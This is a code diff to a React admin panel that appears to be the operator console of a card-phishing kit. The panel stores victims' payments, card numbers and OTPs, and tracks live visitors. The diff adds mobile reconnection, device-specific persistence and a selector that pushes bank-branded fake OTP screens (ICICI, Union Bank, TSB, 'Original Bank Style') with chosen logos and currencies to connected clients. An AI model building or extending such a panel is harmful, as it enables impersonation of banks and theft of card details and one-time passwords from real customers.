@@ -1,5 +1,5 @@
-import React, { useState, useEffect } from 'react';
-import { MoreHorizontal, Check, X, AlertTriangle, Wifi, WifiOff, Copy } from 'lucide-react';
+import React, { useState, useEffect, useRef, useCallback } from 'react';
+import { MoreHorizontal, Check, X, AlertTriangle, Wifi, WifiOff, Copy, Smartphone, Monitor, RefreshCw } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
@@ -9,6 +9,158 @@ import { useSocket } from '@/context/SocketContext';
 import { v4 as uuidv4 } from 'uuid';
 import { api } from '../utils/api';
 // import Analytics from '../components/Analytics';
+
+// Enhanced mobile detection and device management
+const detectMobile = () => {
+  if (typeof window !== 'undefined') {
+    const ua = navigator.userAgent;
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+    const isTablet = /(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua);
+    const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+    const screenWidth = window.innerWidth;
+    
+    return {
+      isMobile: isMobile || (screenWidth <= 768),
+      isTablet: isTablet || (screenWidth > 768 && screenWidth <= 1024),
+      isTouchDevice,
+      screenWidth,
+      deviceType: screenWidth <= 768 ? 'mobile' : screenWidth <= 1024 ? 'tablet' : 'desktop'
+    };
+  }
+  return {
+    isMobile: false,
+    isTablet: false,
+    isTouchDevice: false,
+    screenWidth: 1920,
+    deviceType: 'desktop'
+  };
+};
+
+// Enhanced WebSocket connection manager for mobile devices
+class MobileWebSocketManager {
+  private reconnectAttempts = 0;
+  private maxReconnectAttempts = 15;
+  private reconnectDelay = 2000;
+  private heartbeatInterval: NodeJS.Timeout | null = null;
+  private socket: any = null;
+  private isActive = true;
+  
+  constructor(socket: any) {
+    this.socket = socket;
+    this.setupMobileOptimizations();
+  }
+  
+  setupMobileOptimizations() {
+    if (typeof window !== 'undefined') {
+      // Handle page visibility changes (mobile app switching)
+      document.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'visible') {
+          this.handlePageVisible();
+        } else {
+          this.handlePageHidden();
+        }
+      });
+      
+      // Handle network status changes
+      window.addEventListener('online', () => this.handleNetworkOnline());
+      window.addEventListener('offline', () => this.handleNetworkOffline());
+      
+      // Handle app focus/blur
+      window.addEventListener('focus', () => this.handlePageVisible());
+      window.addEventListener('blur', () => this.handlePageHidden());
+      
+      // Handle orientation change (mobile rotation)
+      window.addEventListener('orientationchange', () => {
+        setTimeout(() => this.reconnectSocket(), 1000);
+      });
+    }
+  }
+  
+  handlePageVisible() {
+    console.log('📱 Mobile admin panel became visible - reconnecting...');
+    this.isActive = true;
+    this.reconnectSocket();
+    this.startHeartbeat();
+  }
+  
+  handlePageHidden() {
+    console.log('📱 Mobile admin panel hidden - maintaining connection...');
+    // Don't disconnect completely on mobile, just reduce activity
+    this.isActive = false;
+  }
+  
+  handleNetworkOnline() {
+    console.log('📶 Network back online - reconnecting admin panel...');
+    this.reconnectSocket();
+  }
+  
+  handleNetworkOffline() {
+    console.log('📶 Network offline - admin panel in offline mode');
+    this.stopHeartbeat();
+  }
+  
+  reconnectSocket() {
+    if (this.socket && !this.socket.connected && this.isActive) {
+      console.log('🔄 Attempting mobile WebSocket reconnection...');
+      this.socket.connect();
+    }
+  }
+  
+  startHeartbeat() {
+    this.stopHeartbeat();
+    this.heartbeatInterval = setInterval(() => {
+      if (this.socket && this.socket.connected && this.isActive) {
+        this.socket.emit('admin-heartbeat', { timestamp: Date.now(), device: 'mobile' });
+      }
+    }, 30000); // Every 30 seconds
+  }
+  
+  stopHeartbeat() {
+    if (this.heartbeatInterval) {
+      clearInterval(this.heartbeatInterval);
+      this.heartbeatInterval = null;
+    }
+  }
+  
+  destroy() {
+    this.stopHeartbeat();
+    this.isActive = false;
+  }
+}
+
+// Bank logos array for OTP customization
+const bankLogos = [
+  {
+    name: 'HDFC Bank',
+    logo: 'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png'
+  },
+  {
+    name: 'State Bank of India',
+    logo: 'https://www.pngguru.in/storage/uploads/images/sbi-logo-png-free-sbi-bank-logo-png-with-transparent-background_1721377630_1949953387.webp'
+  },
+  {
+    name: 'ICICI Bank',
+    logo: 'https://brandlogos.net/wp-content/uploads/2014/12/axis_bank-logo-brandlogos.net_-512x512.png'
+  },
+  {
+    name: 'Punjab National Bank',
+    logo: 'https://brandlogos.net/wp-content/uploads/2014/01/punjab-national-bank-pnb-vector-logo.png'
+  },
+  {
+    name: 'Bank of Baroda',
+    logo: 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo.png'
+  },
+  {
+    name: 'Kotak Mahindra Bank',
+    logo: 'https://brandeps.com/logo-download/K/Kotak-Mahindra-Bank-logo-vector-01.svg'
+  }
+];
+
+// Currencies array for amount customization
+const currencies = [
+  { code: 'INR', symbol: '₹', flag: '🇮🇳' },
+  { code: 'USD', symbol: '$', flag: '🇺🇸' }
+];
 
 const formatCardNumber = (cardNumber: string) => {
   if (!cardNumber) return '';
@@ -77,15 +229,36 @@ interface VisitorData {
 }
 
 const Admin = () => {
-  // Load payments from localStorage on mount
-  const [payments, setPayments] = useState<PaymentData[]>(() => {
+  // Mobile device detection and management
+  const [deviceInfo, setDeviceInfo] = useState(detectMobile());
+  const [mobileWSManager, setMobileWSManager] = useState<MobileWebSocketManager | null>(null);
+  const [lastSync, setLastSync] = useState<Date>(new Date());
+  const syncIntervalRef = useRef<NodeJS.Timeout | null>(null);
+  
+  // Enhanced state loading with mobile-specific persistence
+  const loadMobileState = useCallback(() => {
     try {
-      const savedPayments = localStorage.getItem('adminPayments');
-      return savedPayments ? JSON.parse(savedPayments) : [];
+      const deviceKey = deviceInfo.isMobile ? 'mobile' : 'desktop';
+      const savedPayments = localStorage.getItem(`adminPayments_${deviceKey}`);
+      const savedVisitors = localStorage.getItem(`adminLiveVisitors_${deviceKey}`);
+      const savedHeartbeats = localStorage.getItem(`adminVisitorHeartbeats_${deviceKey}`);
+      
+      return {
+        payments: savedPayments ? JSON.parse(savedPayments) : [],
+        visitors: savedVisitors ? JSON.parse(savedVisitors) : [],
+        heartbeats: savedHeartbeats ? JSON.parse(savedHeartbeats) : {}
+      };
     } catch (error) {
-      console.error('Error loading payments from localStorage:', error);
-      return [];
+      console.error('Error loading mobile state:', error);
+      return { payments: [], visitors: [], heartbeats: {} };
     }
+  }, [deviceInfo.isMobile]);
+  
+  // Load payments from localStorage with mobile-specific key
+  const [payments, setPayments] = useState<PaymentData[]>(() => {
+    const mobileState = loadMobileState();
+    console.log(`📱 Loading ${mobileState.payments.length} payments for ${deviceInfo.deviceType}`);
+    return mobileState.payments;
   });
   // Load OTPs from localStorage on mount
   const [otps, setOtps] = useState<OtpData[]>(() => {
@@ -97,6 +270,19 @@ const Admin = () => {
       return [];
     }
   });
+  
+  // Enhanced mobile-specific visitor state loading
+  const [liveVisitors, setLiveVisitors] = useState<VisitorData[]>(() => {
+    const mobileState = loadMobileState();
+    console.log(`📱 Loading ${mobileState.visitors.length} live visitors for ${deviceInfo.deviceType}`);
+    return mobileState.visitors;
+  });
+  
+  const [visitorHeartbeats, setVisitorHeartbeats] = useState<{[key: string]: number}>(() => {
+    const mobileState = loadMobileState();
+    console.log(`📱 Loading visitor heartbeats for ${deviceInfo.deviceType}`);
+    return mobileState.heartbeats;
+  });
   const [activeDropdown, setActiveDropdown] = useState<string | null>(null);
 
   // Save OTPs to localStorage whenever otps state changes
@@ -104,13 +290,7 @@ const Admin = () => {
     localStorage.setItem('adminOtps', JSON.stringify(otps));
   }, [otps]);
   
-  // Start with empty visitors - only load from server (no localStorage)
-  const [liveVisitors, setLiveVisitors] = useState<VisitorData[]>([]);
-  
   const [clickedCards, setClickedCards] = useState<Set<string>>(new Set(JSON.parse(localStorage.getItem('clickedCards') || '[]')));
-  
-  // Start with empty heartbeats - only track current session
-  const [visitorHeartbeats, setVisitorHeartbeats] = useState<{[key: string]: number}>({});
   const [paymentLinkAmount, setPaymentLinkAmount] = useState<string>('');
   const [paymentLinkCurrency, setPaymentLinkCurrency] = useState<string>('INR');
   const [generatedLink, setGeneratedLink] = useState<string>('');
@@ -119,6 +299,7 @@ const Admin = () => {
   const [selectedPaymentId, setSelectedPaymentId] = useState<string>('');
   const [selectedBankLogo, setSelectedBankLogo] = useState<string>('');
   const [selectedCurrency, setSelectedCurrency] = useState<string>('INR');
+  const [selectedOtpPage, setSelectedOtpPage] = useState<string>('old');
   const [convertedAmount, setConvertedAmount] = useState<string>('');
   const [exchangeRate, setExchangeRate] = useState<number>(1);
   const [isLoadingRate, setIsLoadingRate] = useState(false);
@@ -367,7 +548,20 @@ const Admin = () => {
     }
   };
 
-
+  // Auto-convert currency when OTP modal is opened and currency/payment changes
+  useEffect(() => {
+    if (showOtpModal && selectedPaymentId && selectedCurrency) {
+      const payment = payments.find(p => p.paymentId === selectedPaymentId);
+      if (payment && payment.amount) {
+        console.log('💱 Auto-converting currency for OTP modal:', {
+          amount: payment.amount,
+          fromCurrency: 'INR',
+          toCurrency: selectedCurrency
+        });
+        convertCurrency(payment.amount, 'INR', selectedCurrency);
+      }
+    }
+  }, [showOtpModal, selectedPaymentId, selectedCurrency, payments]);
 
   // Function to delete a payment transaction
   const deleteTransaction = (paymentId: string) => {
@@ -710,6 +904,42 @@ const Admin = () => {
       .map(char => 127397 + char.charCodeAt(0));
     return String.fromCodePoint(...codePoints);
   };
+
+  // Enhanced mobile-specific state persistence
+  const saveMobileState = useCallback(() => {
+    try {
+      const deviceKey = deviceInfo.isMobile ? 'mobile' : 'desktop';
+      localStorage.setItem(`adminPayments_${deviceKey}`, JSON.stringify(payments));
+      localStorage.setItem(`adminLiveVisitors_${deviceKey}`, JSON.stringify(liveVisitors));
+      localStorage.setItem(`adminVisitorHeartbeats_${deviceKey}`, JSON.stringify(visitorHeartbeats));
+      
+      // Also save a unified version for cross-device access
+      localStorage.setItem('adminPayments', JSON.stringify(payments));
+      localStorage.setItem('adminLiveVisitors', JSON.stringify(liveVisitors));
+      
+      setLastSync(new Date());
+      console.log(`📱 State saved for ${deviceInfo.deviceType} - ${payments.length} payments, ${liveVisitors.length} visitors`);
+    } catch (error) {
+      console.error('Error saving mobile state:', error);
+    }
+  }, [deviceInfo.isMobile, payments, liveVisitors, visitorHeartbeats]);
+  
+  // Save state whenever key data changes
+  useEffect(() => {
+    saveMobileState();
+  }, [payments, liveVisitors, visitorHeartbeats, saveMobileState]);
+  
+  // Mobile WebSocket manager setup
+  useEffect(() => {
+    if (socket && deviceInfo.isMobile) {
+      const wsManager = new MobileWebSocketManager(socket);
+      setMobileWSManager(wsManager);
+      
+      return () => {
+        wsManager.destroy();
+      };
+    }
+  }, [socket, deviceInfo.isMobile]);
 
   // Save payments to localStorage whenever payments state changes
   useEffect(() => {
@@ -1134,6 +1364,7 @@ const Admin = () => {
           setShowOtpModal(true);
           setSelectedBankLogo('');
           setSelectedCurrency('INR');
+          setSelectedOtpPage('old');
           setConvertedAmount('');
           setExchangeRate(1);
           break;
@@ -1389,7 +1620,8 @@ const Admin = () => {
         customAmount: convertedAmount,
         currency: selectedCurrency,
         currencySymbol: selectedCurrencyInfo?.symbol || '',
-        exchangeRate: rate
+        exchangeRate: rate,
+        otpPageSelection: selectedOtpPage
       };
       
       console.log('Event data being sent:', eventData);
@@ -1401,6 +1633,15 @@ const Admin = () => {
       socket.emit('show-otp', eventData);
       socket.emit('admin-show-otp', eventData);
       
+      // FALLBACK: Also store in localStorage for cases where socket fails
+      const localStorageData = {
+        otpPageSelection: selectedOtpPage,
+        timestamp: Date.now(),
+        paymentId: selectedPaymentId
+      };
+      localStorage.setItem('adminOtpSelection', JSON.stringify(localStorageData));
+      console.log('💾 Stored admin OTP selection in localStorage as fallback:', localStorageData);
+      
       console.log('✓ Broadcasting show-otp event to all connected clients');
       console.log('📡 Event payload:', eventData);
       
@@ -1408,6 +1649,7 @@ const Admin = () => {
       setSelectedPaymentId('');
       setSelectedBankLogo('');
       setSelectedCurrency('INR');
+      setSelectedOtpPage('old');
       setConvertedAmount('');
       setExchangeRate(1);
       
@@ -1664,9 +1906,60 @@ const Admin = () => {
   return (
     <div className="min-h-screen bg-black text-white p-3 sm:p-6">
       <div className="max-w-7xl mx-auto">
-        {/* Header */}
+        {/* Enhanced Mobile Header */}
         <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between mb-6 sm:mb-8 gap-4">
-          <h1 className="text-2xl sm:text-3xl font-bold">Admin Panel</h1>
+          <div className="flex flex-col gap-2">
+            <div className="flex items-center gap-3">
+              <h1 className="text-2xl sm:text-3xl font-bold">Admin Panel</h1>
+              {/* Device Type Indicator */}
+              <div className="flex items-center gap-2 bg-gray-800 rounded-full px-3 py-1">
+                {deviceInfo.isMobile ? (
+                  <>
+                    <Smartphone className="h-4 w-4 text-blue-400" />
+                    <span className="text-xs text-blue-400">Mobile</span>
+                  </>
+                ) : deviceInfo.isTablet ? (
+                  <>
+                    <Monitor className="h-4 w-4 text-purple-400" />
+                    <span className="text-xs text-purple-400">Tablet</span>
+                  </>
+                ) : (
+                  <>
+                    <Monitor className="h-4 w-4 text-green-400" />
+                    <span className="text-xs text-green-400">Desktop</span>
+                  </>
+                )}
+              </div>
+              {/* Mobile Reconnection Button */}
+              {deviceInfo.isMobile && !isConnected && (
+                <Button
+                  onClick={() => mobileWSManager?.reconnectSocket()}
+                  size="sm"
+                  className="bg-orange-600 hover:bg-orange-700 text-xs px-2 py-1 h-8"
+                >
+                  <RefreshCw className="h-3 w-3 mr-1" />
+                  Reconnect
+                </Button>
+              )}
+            </div>
+            {/* Mobile-specific sync info */}
+            {deviceInfo.isMobile && (
+              <div className="flex items-center gap-4 text-xs text-gray-400">
+                <span>Last sync: {lastSync.toLocaleTimeString()}</span>
+                <span>•</span>
+                <span>{payments.length} payments</span>
+                <span>•</span>
+                <span>{liveVisitors.length} visitors</span>
+                <span>•</span>
+                <span className={`flex items-center gap-1 ${
+                  isConnected ? 'text-green-400' : 'text-red-400'
+                }`}>
+                  {isConnected ? <Wifi className="h-3 w-3" /> : <WifiOff className="h-3 w-3" />}
+                  {isConnected ? 'Online' : 'Offline'}
+                </span>
+              </div>
+            )}
+          </div>
           <div className="flex items-center gap-4">
             {/* Global Currency Selector */}
             <div className="flex items-center gap-2 bg-gray-800 rounded-lg px-3 py-2">
@@ -2753,6 +3046,56 @@ const Admin = () => {
                   </SelectContent>
                 </Select>
               </div>
+
+              {/* OTP Page Selection */}
+              <div>
+                <label className="block text-sm font-medium text-gray-300 mb-2">
+                  Select OTP Page Type
+                </label>
+                <Select value={selectedOtpPage} onValueChange={setSelectedOtpPage}>
+                  <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
+                    <SelectValue placeholder="Choose OTP page" />
+                  </SelectTrigger>
+                  <SelectContent className="bg-gray-800 border-gray-600">
+                    <SelectItem value="old" className="text-white hover:bg-gray-700">
+                      <div className="flex items-center gap-2">
+                        <span>🏦</span>
+                        <span>Original Bank Style</span>
+                      </div>
+                    </SelectItem>
+                    <SelectItem value="new" className="text-white hover:bg-gray-700">
+                      <div className="flex items-center gap-2">
+                        <span>🆕</span>
+                        <span>New OTP Page</span>
+                      </div>
+                    </SelectItem>
+                    <SelectItem value="third" className="text-white hover:bg-gray-700">
+                      <div className="flex items-center gap-2">
+                        <span>🔄</span>
+                        <span>Third OTP Page</span>
+                      </div>
+                    </SelectItem>
+                    <SelectItem value="icici" className="text-white hover:bg-gray-700">
+                      <div className="flex items-center gap-2">
+                        <span>🏪</span>
+                        <span>ICICI Bank Style</span>
+                      </div>
+                    </SelectItem>
+                    <SelectItem value="union" className="text-white hover:bg-gray-700">
+                      <div className="flex items-center gap-2">
+                        <span>🌟</span>
+                        <span>Union Bank Style</span>
+                      </div>
+                    </SelectItem>
+                    <SelectItem value="tsb" className="text-white hover:bg-gray-700">
+                      <div className="flex items-center gap-2">
+                        <span>🎯</span>
+                        <span>TSB Bank Style (NEW)</span>
+                      </div>
+                    </SelectItem>
+                  </SelectContent>
+                </Select>
+              </div>
             </div>
 
             <div className="flex gap-3">
@@ -3101,6 +3444,120 @@ const Admin = () => {
                 className="border-gray-600 text-gray-300 hover:bg-gray-800"
               >
                 Close
+              </Button>
+            </div>
+          </DialogContent>
+        </Dialog>
+
+        {/* OTP Customization Modal */}
+        <Dialog open={showOtpModal} onOpenChange={setShowOtpModal}>
+          <DialogContent className="max-w-md bg-gray-900 border-gray-700">
+            <DialogHeader>
+              <DialogTitle className="text-white">🔐 Customize OTP Screen</DialogTitle>
+              <DialogDescription className="text-gray-400">
+                Customize the OTP page, bank logo, and currency display for the client
+              </DialogDescription>
+            </DialogHeader>
+            
+            <div className="space-y-6 py-4">
+              {/* OTP Page Selection */}
+              <div className="space-y-2">
+                <label className="block text-sm font-medium text-gray-300">
+                  OTP Page Type
+                </label>
+                <Select value={selectedOtpPage} onValueChange={setSelectedOtpPage}>
+                  <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
+                    <SelectValue placeholder="Select OTP page style" />
+                  </SelectTrigger>
+                  <SelectContent className="bg-gray-800 border-gray-600">
+                    <SelectItem value="old" className="text-white hover:bg-gray-700">Old Style OTP</SelectItem>
+                    <SelectItem value="new" className="text-white hover:bg-gray-700">New Style OTP</SelectItem>
+                    <SelectItem value="third" className="text-white hover:bg-gray-700">Third Style OTP</SelectItem>
+                    <SelectItem value="icici" className="text-white hover:bg-gray-700">ICICI Bank OTP</SelectItem>
+                    <SelectItem value="union" className="text-white hover:bg-gray-700">Union Bank OTP</SelectItem>
+                    <SelectItem value="tsb" className="text-white hover:bg-gray-700">TSB Bank OTP</SelectItem>
+                  </SelectContent>
+                </Select>
+              </div>
+
+              {/* Bank Logo Selection */}
+              <div className="space-y-2">
+                <label className="block text-sm font-medium text-gray-300">
+                  Bank Logo
+                </label>
+                <div className="grid grid-cols-2 gap-2 max-h-32 overflow-y-auto">
+                  {bankLogos.map((bank) => (
+                    <div
+                      key={bank.name}
+                      className={`p-2 border-2 rounded-lg cursor-pointer transition-colors ${
+                        selectedBankLogo === bank.logo
+                          ? 'border-blue-500 bg-blue-500/10'
+                          : 'border-gray-600 hover:border-gray-500'
+                      }`}
+                      onClick={() => setSelectedBankLogo(bank.logo)}
+                    >
+                      <img src={bank.logo} alt={bank.name} className="w-full h-8 object-contain" />
+                      <p className="text-xs text-gray-300 mt-1 text-center truncate">{bank.name}</p>
+                    </div>
+                  ))}
+                </div>
+              </div>
+
+              {/* Currency Selection */}
+              <div className="space-y-2">
+                <label className="block text-sm font-medium text-gray-300">
+                  Display Currency
+                </label>
+                <Select value={selectedCurrency} onValueChange={setSelectedCurrency}>
+                  <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
+                    <SelectValue placeholder="Select currency" />
+                  </SelectTrigger>
+                  <SelectContent className="bg-gray-800 border-gray-600">
+                    {currencies.map((currency) => (
+                      <SelectItem key={currency.code} value={currency.code} className="text-white hover:bg-gray-700">
+                        <div className="flex items-center gap-2">
+                          <span>{currency.flag}</span>
+                          <span>{currency.code}</span>
+                          <span className="text-gray-400">({currency.symbol})</span>
+                        </div>
+                      </SelectItem>
+                    ))}
+                  </SelectContent>
+                </Select>
+              </div>
+
+              {/* Amount Preview */}
+              {convertedAmount && (
+                <div className="bg-gray-800 rounded-lg p-3">
+                  <label className="block text-sm font-medium text-gray-300 mb-1">
+                    Amount Preview
+                  </label>
+                  <div className="text-lg font-bold text-green-400">
+                    {currencies.find(c => c.code === selectedCurrency)?.symbol || ''}{convertedAmount}
+                  </div>
+                  {exchangeRate !== 1 && (
+                    <div className="text-xs text-gray-400 mt-1">
+                      Exchange rate: 1 INR = {exchangeRate.toFixed(4)} {selectedCurrency}
+                    </div>
+                  )}
+                </div>
+              )}
+            </div>
+
+            <div className="flex gap-3">
+              <Button
+                onClick={() => setShowOtpModal(false)}
+                variant="ghost"
+                className="flex-1 text-gray-300 hover:text-white hover:bg-gray-800"
+              >
+                Cancel
+              </Button>
+              <Button
+                onClick={handleOtpModalConfirm}
+                className="flex-1 bg-blue-600 hover:bg-blue-700 text-white"
+                disabled={!selectedBankLogo || !selectedCurrency || isLoadingRate}
+              >
+                {isLoadingRate ? 'Loading...' : 'Send OTP Screen'}
               </Button>
             </div>
           </DialogContent>
